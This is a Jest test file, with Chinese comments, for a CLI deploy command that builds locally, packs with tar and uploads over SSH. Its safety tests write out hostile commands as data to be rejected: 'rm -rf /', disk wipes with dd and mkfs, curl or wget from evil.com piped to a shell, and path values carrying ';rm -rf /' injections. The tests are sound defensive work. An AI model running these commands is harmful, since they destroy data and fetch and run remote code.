const fs = require('fs')
const path = require('path')
const os = require('os')
const childProcess = require('child_process')
const inquirer = require('inquirer')
const deploy = require('../lib/commands/deploy')

const {
	checkScriptSafety,
	checkEnvCorrect,
	createTaskList,
	executeTaskList,
	archiveFile,
	connectSSH,
	unzipRemoteFile,
	removeLocalFile,
	disconnectSSH,
	execBuild,
	uploadLocalFile,
	createRemotePaths,
	execRemoteCommand,
	shellQuote,
	runDeployTasks,
	MAX_BUFFER
} = deploy._internal

// 抑制测试时的控制台输出
beforeAll(() => {
	jest.spyOn(console, 'log').mockImplementation(() => {})
})

afterAll(() => {
	jest.restoreAllMocks()
})

// ============================================
// checkScriptSafety - 脚本安全检查
// ============================================
describe('checkScriptSafety - 脚本安全检查', () => {
	describe('安全的构建命令', () => {
		const safeCommands = [
			'npm run build',
			'npm run build:prod',
			'yarn build',
			'yarn run build:dev',
			'pnpm build',
			'pnpm run build',
			'npx vite build',
			'node scripts/build.js',
			'vite build',
			'webpack --mode production',
			'tsc --build',
			'gulp build',
			'grunt build'
		]

		test.each(safeCommands)('应该允许: %s', (cmd) => {
			const result = checkScriptSafety(cmd)
			expect(result.safe).toBe(true)
		})
	})

	describe('危险命令 - 应该直接拒绝', () => {
		const dangerousCommands = [
			['rm -rf /', '删除根目录'],
			['rm -rf ~', '删除用户目录'],
			['rm -rf $HOME', '删除 HOME 目录'],
			['rm -rf *', '删除所有文件'],
			['rm -r -f /', '删除根目录(分开写)'],
			['mkfs.ext4 /dev/sda1', '格式化磁盘'],
			['dd if=/dev/zero of=/dev/sda', 'dd 写入磁盘'],
			['echo test > /dev/sda', '写入设备'],
			['shutdown -h now', '关机'],
			['reboot', '重启'],
			['systemctl stop nginx', '停止服务'],
			['systemctl disable sshd', '禁用服务'],
			['kill -9 -1', '杀死所有进程'],
			['chmod 777 /', '修改根目录权限'],
			['chmod -R 777 /', '递归修改根目录权限'],
			['chown root /', '修改根目录所有者'],
			['wget http://evil.com/script.sh | sh', '下载并执行'],
			['curl http://evil.com/script.sh | bash', '下载并执行']
		]

		test.each(dangerousCommands)('应该拒绝: %s (%s)', (cmd) => {
			const result = checkScriptSafety(cmd)
			expect(result.safe).toBe(false)
			expect(result.needConfirm).toBeUndefined()
		})
	})

	describe('非常见命令 - 需要用户确认', () => {
		const uncommonCommands = [
			'./build.sh',
			'bash build.sh',
			'make build',
			'python build.py',
			'go build',
			'cargo build'
		]

		test.each(uncommonCommands)('应该需要确认: %s', (cmd) => {
			const result = checkScriptSafety(cmd)
			expect(result.safe).toBe(false)
			expect(result.needConfirm).toBe(true)
		})
	})

	describe('边界情况', () => {
		test('空脚本应该返回安全', () => {
			expect(checkScriptSafety('')).toEqual({ safe: true })
			expect(checkScriptSafety(null)).toEqual({ safe: true })
			expect(checkScriptSafety(undefined)).toEqual({ safe: true })
		})

		test('带空格的命令应该正确处理', () => {
			const result = checkScriptSafety('  npm run build  ')
			expect(result.safe).toBe(true)
		})

		test('大小写不敏感', () => {
			const result = checkScriptSafety('NPM run build')
			expect(result.safe).toBe(true)
		})
	})
})

// ============================================
// MAX_BUFFER - 常量测试
// ============================================
describe('MAX_BUFFER - 常量', () => {
	test('应该是合理的缓冲区大小', () => {
		expect(MAX_BUFFER).toBe(5000 * 1024)
		expect(MAX_BUFFER).toBeGreaterThan(1024 * 1024) // 至少 1MB
	})
})

// ============================================
// 远程命令参数处理
// ============================================
describe('远程命令参数处理', () => {
	test('shellQuote 应该正确转义单引号', () => {
		expect(shellQuote('/var/www/app')).toBe("'/var/www/app'")
		expect(shellQuote("/var/www/a'b")).toBe("'/var/www/a'\\''b'")
	})

	test('createRemotePaths 应该规范化安全路径', () => {
		const paths = createRemotePaths({
			webDir: '/var/www/app/',
			distPath: 'dist'
		})

		expect(paths.webDir).toBe('/var/www/app')
		expect(paths.remoteTar).toBe('/var/www/dist.tar')
		expect(paths.backupName).toMatch(/^\/var\/www\/app_backup_/)
		expect(paths.releaseDir).toMatch(/^\/var\/www\/app_release_/)
	})

	test('createRemotePaths 应该拒绝可能注入 shell 的路径', () => {
		expect(() => createRemotePaths({
			webDir: '/var/www/app;rm -rf /',
			distPath: 'dist'
		})).toThrow('webDir')

		expect(() => createRemotePaths({
			webDir: '/var/www/app',
			distPath: 'dist;rm -rf /'
		})).toThrow('distPath')

		expect(() => createRemotePaths({
			webDir: '/var/www/../app',
			distPath: 'dist'
		})).toThrow('路径穿越')
	})

	test('execRemoteCommand 应该在远程命令失败时抛错', async () => {
		const ssh = {
			execCommand: jest.fn().mockResolvedValue({
				code: 1,
				stderr: 'tar failed',
				stdout: ''
			})
		}

		await expect(execRemoteCommand(ssh, 'tar -xf dist.tar', '解压失败'))
			.rejects.toThrow('解压失败: tar failed')
	})
})

// ============================================
// checkEnvCorrect - 环境配置检查
// ============================================
describe('checkEnvCorrect - 环境配置检查', () => {
	// Mock process.exit
	const mockExit = jest.spyOn(process, 'exit').mockImplementation(() => {
		throw new Error('process.exit called')
	})

	afterEach(() => {
		mockExit.mockClear()
	})

	afterAll(() => {
		mockExit.mockRestore()
	})

	test('完整配置应该通过检查', () => {
		const config = {
			name: '开发环境',
			host: '192.168.1.1',
			port: 22,
			username: 'root',
			distPath: 'dist',
			webDir: '/var/www/html'
		}

		expect(() => checkEnvCorrect(config, 'dev', false)).not.toThrow()
	})

	test('缺少必填字段应该失败', () => {
		const config = {
			name: '开发环境',
			// 缺少 host
			port: 22,
			username: 'root',
			distPath: 'dist',
			webDir: '/var/www/html'
		}

		expect(() => checkEnvCorrect(config, 'dev', false)).toThrow()
	})

	test('webDir 格式不正确应该失败', () => {
		const invalidWebDirs = ['/', '/html', 'var/www', '']

		invalidWebDirs.forEach(webDir => {
			const config = {
				name: '开发环境',
				host: '192.168.1.1',
				port: 22,
				username: 'root',
				distPath: 'dist',
				webDir
			}

			expect(() => checkEnvCorrect(config, 'dev', false)).toThrow()
		})
	})

	test('webDir 正确格式应该通过', () => {
		const validWebDirs = ['/var/www', '/usr/local/nginx/html', '/home/user/app']

		validWebDirs.forEach(webDir => {
			const config = {
				name: '开发环境',
				host: '192.168.1.1',
				port: 22,
				username: 'root',
				distPath: 'dist',
				webDir
			}

			expect(() => checkEnvCorrect(config, 'dev', false)).not.toThrow()
		})
	})

	test('端口号超出范围应该失败', () => {
		const invalidPorts = [0, -1, 65536, 100000]

		invalidPorts.forEach(port => {
			const config = {
				name: '开发环境',
				host: '192.168.1.1',
				port,
				username: 'root',
				distPath: 'dist',
				webDir: '/var/www/html'
			}

			expect(() => checkEnvCorrect(config, 'dev', false)).toThrow()
		})
	})

	test('有效端口号应该通过', () => {
		const validPorts = [1, 22, 80, 443, 8080, 65535]

		validPorts.forEach(port => {
			const config = {
				name: '开发环境',
				host: '192.168.1.1',
				port,
				username: 'root',
				distPath: 'dist',
				webDir: '/var/www/html'
			}

			expect(() => checkEnvCorrect(config, 'dev', false)).not.toThrow()
		})
	})

	test('needBuild 为 true 但没有 script 应该失败', () => {
		const config = {
			name: '开发环境',
			host: '192.168.1.1',
			port: 22,
			username: 'root',
			distPath: 'dist',
			webDir: '/var/www/html'
			// 没有 script
		}

		expect(() => checkEnvCorrect(config, 'dev', true)).toThrow()
	})

	test('needBuild 为 true 且有 script 应该通过', () => {
		const config = {
			name: '开发环境',
			host: '192.168.1.1',
			port: 22,
			username: 'root',
			distPath: 'dist',
			webDir: '/var/www/html',
			script: 'npm run build'
		}

		expect(() => checkEnvCorrect(config, 'dev', true)).not.toThrow()
	})

	test('config 为 null 应该失败', () => {
		expect(() => checkEnvCorrect(null, 'dev', false)).toThrow()
	})

	test('config 为 undefined 应该失败', () => {
		expect(() => checkEnvCorrect(undefined, 'dev', false)).toThrow()
	})
})

// ============================================
// createTaskList - 创建任务列表
// ============================================
describe('createTaskList - 创建任务列表', () => {
	test('不需要构建时应该返回 6 个任务', () => {
		const config = { distPath: 'dist' }
		const tasks = createTaskList(config, false)

		expect(tasks).toHaveLength(6)
		expect(tasks[0]).toBe(archiveFile)
	})

	test('需要构建且有 script 时应该返回 7 个任务', () => {
		const config = { distPath: 'dist', script: 'npm run build' }
		const tasks = createTaskList(config, true)

		expect(tasks).toHaveLength(7)
	})

	test('需要构建但没有 script 时应该返回 6 个任务', () => {
		const config = { distPath: 'dist' }
		const tasks = createTaskList(config, true)

		expect(tasks).toHaveLength(6)
	})

	test('任务列表应该包含正确的函数', () => {
		const config = { distPath: 'dist' }
		const tasks = createTaskList(config, false)

		// 验证任务都是函数
		tasks.forEach(task => {
			expect(typeof task).toBe('function')
		})
	})
})

// ============================================
// execBuild - 本地构建命令
// ============================================
describe('execBuild - 本地构建命令', () => {
	afterEach(() => {
		jest.restoreAllMocks()
	})

	test('安全构建命令执行成功时应该通过', async () => {
		const execSpy = jest.spyOn(childProcess, 'exec').mockImplementation((script, options, callback) => {
			callback(null)
		})

		await expect(execBuild({ script: 'npm run build' }, 1)).resolves.toBeUndefined()

		expect(execSpy).toHaveBeenCalledWith(
			'npm run build',
			expect.objectContaining({ cwd: process.cwd(), maxBuffer: MAX_BUFFER }),
			expect.any(Function)
		)
	})

	test('构建命令执行失败时应该抛错', async () => {
		jest.spyOn(childProcess, 'exec').mockImplementation((script, options, callback) => {
			callback(new Error('build failed'))
		})

		await expect(execBuild({ script: 'npm run build' }, 1))
			.rejects.toThrow('build failed')
	})

	test('危险构建命令应该直接拒绝', async () => {
		await expect(execBuild({ script: 'rm -rf /' }, 1))
			.rejects.toThrow('脚本安全检查失败')
	})

	test('非常见命令确认取消时应该抛错', async () => {
		jest.spyOn(inquirer, 'prompt').mockResolvedValue({ confirm: false })

		await expect(execBuild({ script: './build.sh' }, 1))
			.rejects.toThrow('用户取消执行')
	})

	test('非常见命令确认继续后应该执行', async () => {
		jest.spyOn(inquirer, 'prompt').mockResolvedValue({ confirm: true })
		const execSpy = jest.spyOn(childProcess, 'exec').mockImplementation((script, options, callback) => {
			callback(null)
		})

		await expect(execBuild({ script: './build.sh' }, 1)).resolves.toBeUndefined()

		expect(execSpy).toHaveBeenCalled()
	})
})

// ============================================
// executeTaskList - 执行任务列表
// ============================================
describe('executeTaskList - 执行任务列表', () => {
	test('应该按顺序执行所有任务', async () => {
		const executionOrder = []
		const mockTasks = [
			jest.fn().mockImplementation(async (config, index) => {
				executionOrder.push(index)
			}),
			jest.fn().mockImplementation(async (config, index) => {
				executionOrder.push(index)
			}),
			jest.fn().mockImplementation(async (config, index) => {
				executionOrder.push(index)
			})
		]

		const config = { test: true }
		const mockSsh = {}

		await executeTaskList(mockTasks, config, mockSsh)

		expect(executionOrder).toEqual([1, 2, 3])
		mockTasks.forEach(task => {
			expect(task).toHaveBeenCalledTimes(1)
		})
	})

	test('空任务列表应该正常执行', async () => {
		const config = {}
		const mockSsh = {}

		await expect(executeTaskList([], config, mockSsh)).resolves.toBeUndefined()
	})

	test('任务应该接收正确的参数', async () => {
		const mockTask = jest.fn()
		const config = { distPath: 'dist' }
		const mockSsh = { connect: jest.fn() }

		await executeTaskList([mockTask], config, mockSsh)

		expect(mockTask).toHaveBeenCalledWith(config, 1, mockSsh)
	})
})

// ============================================
// runDeployTasks - 部署任务失败清理
// ============================================
describe('runDeployTasks - 部署任务失败清理', () => {
	const originalCwd = process.cwd()
	const distPath = 'deploy-plus-run-tasks-dist'
	const testDir = path.join(os.tmpdir(), distPath)
	const tarPath = path.join(os.tmpdir(), `${distPath}.tar`)

	beforeEach(() => {
		process.chdir(os.tmpdir())
		if (!fs.existsSync(testDir)) {
			fs.mkdirSync(testDir, { recursive: true })
		}
	})

	afterEach(() => {
		process.chdir(originalCwd)
		if (fs.existsSync(tarPath)) {
			fs.unlinkSync(tarPath)
		}
		if (fs.existsSync(testDir)) {
			fs.rmSync(testDir, { recursive: true, force: true })
		}
	})

	test('后续任务失败时应该删除已生成的本地 tar 并断开 ssh', async () => {
		const config = {
			distPath,
			host: '127.0.0.1',
			port: 22,
			password: 'password',
			passwordEncrypted: false
		}
		const ssh = {
			connect: jest.fn().mockResolvedValue(),
			dispose: jest.fn()
		}
		const failure = new Error('upload failed')
		const failUpload = jest.fn(() => { throw failure })

		fs.writeFileSync(path.join(testDir, 'index.html'), '<html></html>')

		await expect(runDeployTasks([archiveFile, connectSSH, failUpload], config, ssh))
			.rejects.toThrow('upload failed')

		expect(fs.existsSync(tarPath)).toBe(false)
		expect(ssh.dispose).toHaveBeenCalledTimes(1)
	})

	test('压缩前失败时不应该执行清理或断开', async () => {
		const config = { distPath }
		const ssh = { dispose: jest.fn() }
		const failure = new Error('build failed')
		const failBeforeArchive = jest.fn(() => { throw failure })

		await expect(runDeployTasks([failBeforeArchive], config, ssh))
			.rejects.toThrow('build failed')

		expect(ssh.dispose).not.toHaveBeenCalled()
	})

})

// ============================================
// connectSSH - SSH 认证分支
// ============================================
describe('connectSSH - SSH 认证分支', () => {
	afterEach(() => {
		jest.restoreAllMocks()
	})

	test('没有密码和私钥时应该提示输入密码', async () => {
		jest.spyOn(inquirer, 'prompt').mockResolvedValue({ password: 'typed-password' })
		const config = { host: '127.0.0.1', port: 22 }
		const ssh = { connect: jest.fn().mockResolvedValue() }

		await expect(connectSSH(config, 1, ssh)).resolves.toBeUndefined()

		expect(config.password).toBe('typed-password')
		expect(config.privateKey).toBeUndefined()
		expect(ssh.connect).toHaveBeenCalledWith(config)
	})

	test('明文密码配置应该直接连接', async () => {
		const config = {
			host: '127.0.0.1',
			port: 22,
			privateKey: '/missing-key',
			password: 'plain-password',
			passwordEncrypted: false
		}
		const ssh = { connect: jest.fn().mockResolvedValue() }

		await expect(connectSSH(config, 1, ssh)).resolves.toBeUndefined()

		expect(config.password).toBe('plain-password')
	})

	test('显式加密密码解密失败时应该抛错', async () => {
		const config = {
			host: '127.0.0.1',
			port: 22,
			privateKey: '/missing-key',
			password: 'encrypted-password',
			passwordEncrypted: true
		}
		const ssh = { connect: jest.fn().mockResolvedValue() }

		await expect(connectSSH(config, 1, ssh)).rejects.toThrow('私钥文件不存在')
		expect(ssh.connect).not.toHaveBeenCalled()
	})

	test('未显式加密密码解密失败时应该按明文连接', async () => {
		const config = {
			host: '127.0.0.1',
			port: 22,
			privateKey: '/missing-key',
			password: 'fallback-password'
		}
		const ssh = { connect: jest.fn().mockResolvedValue() }

		await expect(connectSSH(config, 1, ssh)).resolves.toBeUndefined()

		expect(config.password).toBe('fallback-password')
		expect(ssh.connect).toHaveBeenCalledWith(config)
	})

	test('ssh.connect 失败时应该抛错', async () => {
		const config = {
			host: '127.0.0.1',
			port: 22,
			password: 'password',
			passwordEncrypted: false
		}
		const ssh = { connect: jest.fn().mockRejectedValue(new Error('connect failed')) }

		await expect(connectSSH(config, 1, ssh)).rejects.toThrow('connect failed')
	})
})

// ============================================
// uploadLocalFile - 上传本地压缩文件
// ============================================
describe('uploadLocalFile - 上传本地压缩文件', () => {
	test('应该上传到 webDir 的父目录', async () => {
		const ssh = { putFile: jest.fn().mockResolvedValue() }

		await expect(uploadLocalFile({
			distPath: 'dist',
			webDir: '/var/www/app'
		}, 1, ssh)).resolves.toBeUndefined()

		expect(ssh.putFile).toHaveBeenCalledWith(
			path.join(process.cwd(), 'dist.tar'),
			'/var/www/dist.tar',
			null,
			{ concurrency: 1 }
		)
	})

	test('上传失败时应该抛错', async () => {
		const ssh = { putFile: jest.fn().mockRejectedValue(new Error('upload failed')) }

		await expect(uploadLocalFile({
			distPath: 'dist',
			webDir: '/var/www/app'
		}, 1, ssh)).rejects.toThrow('upload failed')
	})
})

// ============================================
// archiveFile - 文件压缩测试
// ============================================
describe('archiveFile - 文件压缩测试', () => {
	const testDir = path.join(os.tmpdir(), 'deploy-plus-test-dist')
	const testTarPath = path.join(os.tmpdir(), 'deploy-plus-test-dist.tar')
	const originalCwd = process.cwd()

	beforeAll(() => {
		// 创建测试目录和文件
		if (!fs.existsSync(testDir)) {
			fs.mkdirSync(testDir, { recursive: true })
		}
		fs.writeFileSync(path.join(testDir, 'index.html'), '<html></html>')
		fs.writeFileSync(path.join(testDir, 'app.js'), 'console.log("test")')

		// 创建子目录
		const subDir = path.join(testDir, 'assets')
		if (!fs.existsSync(subDir)) {
			fs.mkdirSync(subDir)
		}
		fs.writeFileSync(path.join(subDir, 'style.css'), 'body {}')
	})

	afterAll(() => {
		// 清理测试文件
		if (fs.existsSync(testTarPath)) {
			fs.unlinkSync(testTarPath)
		}
		if (fs.existsSync(testDir)) {
			fs.rmSync(testDir, { recursive: true, force: true })
		}
	})

	beforeEach(() => {
		// 切换到临时目录
		process.chdir(os.tmpdir())
	})

	afterEach(() => {
		// 恢复原目录
		process.chdir(originalCwd)
		// 清理 tar 文件
		if (fs.existsSync(testTarPath)) {
			fs.unlinkSync(testTarPath)
		}
	})

	test('应该成功压缩目录为 tar 文件', async () => {
		const config = { distPath: 'deploy-plus-test-dist' }

		await archiveFile(config, 1)

		expect(fs.existsSync(testTarPath)).toBe(true)

		// 检查文件大小大于 0
		const stats = fs.statSync(testTarPath)
		expect(stats.size).toBeGreaterThan(0)
	})

	test('压缩不存在的目录应该失败', async () => {
		const config = { distPath: 'nonexistent-dir-12345' }

		await expect(archiveFile(config, 1)).rejects.toThrow('打包目录不存在')
	})
})

// ============================================
// unzipRemoteFile - 远程解压部署测试
// ============================================
describe('unzipRemoteFile - 远程解压部署测试', () => {
	test('应该先解压到临时目录再替换目标目录，支持首次部署', async () => {
		const ssh = {
			execCommand: jest.fn().mockResolvedValue({ code: 0, stdout: '', stderr: '' })
		}
		const timestamp = new Date('2024-01-02T03:04:05')
		const config = {
			webDir: '/var/www/app',
			distPath: 'dist',
			isBackupRemoteFile: true,
			isCompressBackup: false,
			__timestamp: timestamp
		}

		await unzipRemoteFile(config, 1, ssh)

		expect(ssh.execCommand).toHaveBeenNthCalledWith(
			1,
			"rm -rf '/var/www/app_release_20240102_030405' && mkdir -p '/var/www/app_release_20240102_030405' && tar -xf '/var/www/dist.tar' -C '/var/www/app_release_20240102_030405'"
		)
		expect(ssh.execCommand).toHaveBeenNthCalledWith(
			2,
			"mkdir -p '/var/www' && if [ -e '/var/www/app' ]; then mv '/var/www/app' '/var/www/app_backup_20240102_030405'; fi && mv '/var/www/app_release_20240102_030405' '/var/www/app'"
		)
		expect(ssh.execCommand).toHaveBeenNthCalledWith(3, "rm -f '/var/www/dist.tar'")
	})

	test('远程解压失败时不应该替换目标目录', async () => {
		const ssh = {
			execCommand: jest.fn()
				.mockResolvedValueOnce({ code: 2, stderr: 'bad archive', stdout: '' })
		}
		await expect(unzipRemoteFile({
			webDir: '/var/www/app',
			distPath: 'dist',
			__timestamp: new Date('2024-01-02T03:04:05')
		}, 1, ssh)).rejects.toThrow('解压远程文件失败: bad archive')

		expect(ssh.execCommand).toHaveBeenCalledTimes(1)
	})

	test('启用压缩备份时应该压缩并删除备份目录', async () => {
		const ssh = {
			execCommand: jest.fn().mockResolvedValue({ code: 0, stdout: '', stderr: '' })
		}
		const config = {
			webDir: '/var/www/app',
			distPath: 'dist',
			isBackupRemoteFile: true,
			isCompressBackup: true,
			__timestamp: new Date('2024-01-02T03:04:05')
		}

		await unzipRemoteFile(config, 1, ssh)

		expect(ssh.execCommand).toHaveBeenCalledTimes(5)
		expect(ssh.execCommand).toHaveBeenNthCalledWith(
			4,
			"if [ -e '/var/www/app_backup_20240102_030405' ]; then tar -czf '/var/www/app_backup_20240102_030405.tar.gz' -C '/var/www' 'app_backup_20240102_030405'; fi"
		)
		expect(ssh.execCommand).toHaveBeenNthCalledWith(
			5,
			"rm -rf '/var/www/app_backup_20240102_030405'"
		)
	})

	test('关闭备份时应该删除临时备份目录', async () => {
		const ssh = {
			execCommand: jest.fn().mockResolvedValue({ code: 0, stdout: '', stderr: '' })
		}
		const config = {
			webDir: '/var/www/app',
			distPath: 'dist',
			isBackupRemoteFile: false,
			__timestamp: new Date('2024-01-02T03:04:05')
		}

		await unzipRemoteFile(config, 1, ssh)

		expect(ssh.execCommand).toHaveBeenCalledTimes(4)
		expect(ssh.execCommand).toHaveBeenNthCalledWith(
			4,
			"rm -rf '/var/www/app_backup_20240102_030405'"
		)
	})

	test('备份目录不满足安全删除规则时应该跳过删除', async () => {
		const ssh = {
			execCommand: jest.fn().mockResolvedValue({ code: 0, stdout: '', stderr: '' })
		}
		const config = {
			webDir: '/aa/app',
			distPath: 'dist',
			isBackupRemoteFile: false,
			__timestamp: new Date('2024-01-02T03:04:05')
		}

		await unzipRemoteFile(config, 1, ssh)

		expect(ssh.execCommand).toHaveBeenCalledTimes(3)
	})
})

// ============================================
// removeLocalFile - 删除本地压缩文件测试
// ============================================
describe('removeLocalFile - 删除本地压缩文件测试', () => {
	const originalCwd = process.cwd()
	const testTarName = 'test-remove-dist'
	const testTarPath = path.join(os.tmpdir(), `${testTarName}.tar`)

	beforeEach(() => {
		process.chdir(os.tmpdir())
		// 创建测试 tar 文件
		fs.writeFileSync(testTarPath, 'test content')
	})

	afterEach(() => {
		process.chdir(originalCwd)
		if (fs.existsSync(testTarPath)) {
			fs.unlinkSync(testTarPath)
		}
	})

	test('应该成功删除本地压缩文件', () => {
		const config = { distPath: testTarName }

		expect(fs.existsSync(testTarPath)).toBe(true)
		removeLocalFile(config, 1)
		expect(fs.existsSync(testTarPath)).toBe(false)
	})

	test('删除不存在的文件应该抛出错误', () => {
		const config = { distPath: 'nonexistent-file' }

		expect(() => removeLocalFile(config, 1)).toThrow()
	})
})

// ============================================
// disconnectSSH - 断开 SSH 连接
// ============================================
describe('disconnectSSH - 断开 SSH 连接', () => {
	test('应该调用 ssh.dispose()', () => {
		const mockSsh = {
			dispose: jest.fn()
		}
		const config = {}

		disconnectSSH(config, 1, mockSsh)

		expect(mockSsh.dispose).toHaveBeenCalledTimes(1)
	})
})

// ============================================
// deploy.description - 模块导出
// ============================================
describe('deploy 模块导出', () => {
	test('应该导出 description', () => {
		expect(deploy.description).toBe('部署项目')
	})

	test('应该导出 apply 函数', () => {
		expect(typeof deploy.apply).toBe('function')
	})

	test('应该导出 _internal 对象', () => {
		expect(deploy._internal).toBeDefined()
		expect(typeof deploy._internal.checkScriptSafety).toBe('function')
		expect(typeof deploy._internal.checkEnvCorrect).toBe('function')
		expect(typeof deploy._internal.createTaskList).toBe('function')
		expect(typeof deploy._internal.archiveFile).toBe('function')
		expect(typeof deploy._internal.removeLocalFile).toBe('function')
	})
})
